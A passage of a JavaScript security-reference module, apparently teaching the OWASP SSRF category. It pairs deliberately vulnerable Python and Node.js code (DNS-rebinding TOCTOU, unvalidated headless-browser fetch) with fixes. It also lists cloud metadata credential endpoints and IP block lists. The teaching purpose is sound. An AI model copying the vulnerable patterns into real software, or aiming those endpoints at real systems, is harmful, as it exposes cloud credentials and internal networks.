        conn.setReadTimeout(5000);
        conn.setInstanceFollowRedirects(false); // No redirects

        if (conn.getResponseCode() != 200) {
            throw new IOException("Failed to fetch resource: " + conn.getResponseCode());
        }

        return conn.getInputStream().readAllBytes();
    }
}`,
      },
      {
        title: 'Vulnerable: SSRF via DNS Rebinding (Python)',
        language: 'python',
        vulnerable: `
import requests
import socket
from urllib.parse import urlparse

def fetch_url_with_ip_check(url):
    """Attempt at SSRF prevention that is vulnerable to DNS rebinding."""
    parsed = urlparse(url)
    hostname = parsed.hostname

    # Check IP at validation time
    ip = socket.gethostbyname(hostname)
    if ipaddress.ip_address(ip).is_private:
        raise ValueError("Private IPs not allowed")

    # Time gap between DNS check and actual request (TOCTOU)
    # Attacker's DNS server returns public IP first, then private IP
    response = requests.get(url)  # DNS re-resolved here -- may get different IP
    return response.text`,
        fixed: `
import requests
import socket
import ipaddress
from urllib.parse import urlparse
from requests.adapters import HTTPAdapter

class SafeResolver:
    """Resolver that validates IPs and caches the resolution to prevent rebinding."""

    BLOCKED_NETWORKS = [
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.168.0.0/16'),
        ipaddress.ip_network('127.0.0.0/8'),
        ipaddress.ip_network('169.254.0.0/16'),
        ipaddress.ip_network('0.0.0.0/8'),
        ipaddress.ip_network('100.64.0.0/10'),
        ipaddress.ip_network('::1/128'),
        ipaddress.ip_network('fc00::/7'),
        ipaddress.ip_network('fe80::/10'),
    ]

    @classmethod
    def resolve_and_validate(cls, hostname):
        """Resolve hostname and validate all IPs are not private."""
        try:
            addrinfo = socket.getaddrinfo(hostname, None)
        except socket.gaierror:
            raise ValueError(f"Cannot resolve hostname: {hostname}")

        validated_ips = []
        for entry in addrinfo:
            ip = ipaddress.ip_address(entry[4][0])
            for network in cls.BLOCKED_NETWORKS:
                if ip in network:
                    raise ValueError(
                        f"Resolved IP {ip} is in blocked range {network}")
            validated_ips.append(str(ip))

        return validated_ips


def fetch_url_safely(url):
    """Fetch URL with DNS rebinding protection."""
    parsed = urlparse(url)

    # Validate scheme
    if parsed.scheme not in ('http', 'https'):
        raise ValueError(f"Scheme not allowed: {parsed.scheme}")

    hostname = parsed.hostname
    if not hostname:
        raise ValueError("No hostname in URL")

    # Resolve and validate IP ONCE
    validated_ips = SafeResolver.resolve_and_validate(hostname)

    # Force the request to use the validated IP (prevents DNS rebinding)
    # by creating a session that pins to the resolved IP
    session = requests.Session()

    # Replace hostname with validated IP in the URL
    target_ip = validated_ips[0]
    if ':' in target_ip:
        ip_url = url.replace(hostname, f'[{target_ip}]')
    else:
        ip_url = url.replace(hostname, target_ip)

    response = session.get(
        ip_url,
        headers={'Host': hostname},  # Preserve original Host header
        allow_redirects=False,
        timeout=5,
        verify=True,
    )

    # If redirect, validate the redirect target too
    if response.status_code in (301, 302, 303, 307, 308):
        raise ValueError("Redirects are not followed for security reasons")

    return response.text`,
      },
      {
        title: 'Vulnerable: SSRF via Cloud Metadata Access (Node.js)',
        language: 'javascript',
        vulnerable: `
// Common cloud metadata endpoints that SSRF can target:
//
// AWS IMDSv1:
//   http://169.254.169.254/latest/meta-data/
//   http://169.254.169.254/latest/meta-data/iam/security-credentials/
//   http://169.254.169.254/latest/user-data/
//
// GCP:
//   http://metadata.google.internal/computeMetadata/v1/
//   http://169.254.169.254/computeMetadata/v1/
//
// Azure:
//   http://169.254.169.254/metadata/instance?api-version=2021-02-01
//   http://169.254.169.254/metadata/identity/oauth2/token
//
// DigitalOcean:
//   http://169.254.169.254/metadata/v1/

app.get('/api/screenshot', async (req, res) => {
  const url = req.query.url;
  // Headless browser fetches URL -- can access metadata endpoints
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto(url);
  const screenshot = await page.screenshot();
  await browser.close();
  res.type('image/png').send(screenshot);
});`,
        fixed: `
const puppeteer = require('puppeteer');
const { URL } = require('url');
const dns = require('dns').promises;
const net = require('net');

// Cloud metadata IPs to block
const METADATA_IPS = [
  '169.254.169.254',
  'fd00:ec2::254',
  '169.254.170.2',
];

// Comprehensive private IP check
function isPrivateOrMetadata(ip) {
  if (METADATA_IPS.includes(ip)) return true;

  if (net.isIPv4(ip)) {
    const parts = ip.split('.').map(Number);
    if (parts[0] === 10) return true;
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
    if (parts[0] === 192 && parts[1] === 168) return true;
    if (parts[0] === 127) return true;
    if (parts[0] === 169 && parts[1] === 254) return true;
    if (parts[0] === 0) return true;
  }

  if (net.isIPv6(ip)) {
    if (ip === '::1') return true;
    if (ip.startsWith('fc') || ip.startsWith('fd')) return true;
    if (ip.startsWith('fe80')) return true;
  }

  return false;
}

async function validateUrl(url) {
  const parsed = new URL(url);

  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Only HTTP(S) protocols are allowed');
  }

  // Resolve all IPs and validate
  const hostname = parsed.hostname;

  // Check for IP literal
  if (net.isIP(hostname)) {
    if (isPrivateOrMetadata(hostname)) {
      throw new Error('Access to private/metadata IPs is not allowed');
    }
    return;
  }

  // Check for metadata hostname
  if (hostname === 'metadata.google.internal') {
    throw new Error('Access to cloud metadata is not allowed');
  }

  // Resolve and check all IPs
  const addresses = await dns.resolve4(hostname).catch(() => []);
  const v6addresses = await dns.resolve6(hostname).catch(() => []);
  const allAddresses = [...addresses, ...v6addresses];

  if (allAddresses.length === 0) {
    throw new Error('Cannot resolve hostname');
  }

  for (const addr of allAddresses) {
    if (isPrivateOrMetadata(addr)) {
      throw new Error('Resolved IP is in a blocked range');
    }
  }
}

app.get('/api/screenshot', async (req, res) => {
  const url = req.query.url;

  try {
    await validateUrl(url);
  } catch (err) {
    return res.status(400).json({ error: err.message });
  }

  const browser = await puppeteer.launch({
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      // Block access to metadata endpoints at the browser level
      '--host-resolver-rules=MAP metadata.google.internal 0.0.0.0,' +
        'MAP 169.254.169.254 0.0.0.0',
      '--disable-dev-shm-usage',
    ],
  });

  try {
    const page = await browser.newPage();

    // Intercept and validate all network requests
    await page.setRequestInterception(true);
    page.on('request', async (request) => {
      try {
        await validateUrl(request.url());
        request.continue();
      } catch (e) {
        request.abort('blockedbyclient');
      }
    });

    await page.goto(url, { timeout: 10000, waitUntil: 'networkidle0' });
    const screenshot = await page.screenshot({ type: 'png' });
    res.type('image/png').send(screenshot);
  } finally {
    await browser.close();
  }
});

// AWS: Enforce IMDSv2 to prevent SSRF-based metadata access
// aws ec2 modify-instance-metadata-options \\
//   --instance-id i-1234567890abcdef0 \\
//   --http-tokens required \\
//   --http-endpoint enabled`,
      },
    ],

    references: [
      'https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
      'https://portswigger.net/web-security/ssrf',
      'https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html',
      'https://cloud.google.com/compute/docs/metadata/overview',
      'Case Study: Capital One breach (2019) -- SSRF on WAF + misconfigured IAM = 106M records, $80M fine',
      'Case Study: Shopify SSRF (2020) -- internal infrastructure exposure via Shopify exchange marketplace',
      'Case Study: GitLab SSRF (2021) -- CVE-2021-22214 -- internal network scanning via webhook',
      'Case Study: Microsoft Exchange SSRF (2021) -- ProxyLogon CVE-2021-26855 -- chained with RCE',
    ],
  },
];

/**
 * Utility: Look up an OWASP entry by its identifier.
 *
 * @param {string} id - The OWASP identifier (e.g., 'A01', 'A03').
 * @returns {Object|undefined} The matching OWASP entry, or undefined if not found.
 */
export function getOwaspById(id) {
  return OWASP_TOP_10.find(entry => entry.id === id);
}

/**
 * Utility: Search OWASP entries by keyword across all text fields.
 *
 * @param {string} keyword - The search term (case-insensitive).
 * @returns {Object[]} Array of matching OWASP entries.
 */
export function searchOwasp(keyword) {
  const lowerKeyword = keyword.toLowerCase();
  return OWASP_TOP_10.filter(entry => {
    const searchableText = [
      entry.id,
      entry.name,
      entry.description,
      entry.impact,
      ...entry.examples,
      ...entry.testingGuide,
      ...entry.tools,
      ...entry.remediation,
      ...entry.references,
    ].join(' ').toLowerCase();
    return searchableText.includes(lowerKeyword);
  });
}

/**
 * Utility: Get a summary of all OWASP Top 10 entries.
 *
 * @returns {Object[]} Array of {id, name, exampleCount, toolCount, codeExampleCount}.
 */
export function getOwaspSummary() {
  return OWASP_TOP_10.map(entry => ({
    id: entry.id,
    name: entry.name,
    exampleCount: entry.examples.length,
    testingGuideSteps: entry.testingGuide.length,
    toolCount: entry.tools.length,
    codeExampleCount: entry.codeExamples.length,
    referenceCount: entry.references.length,
  }));
}
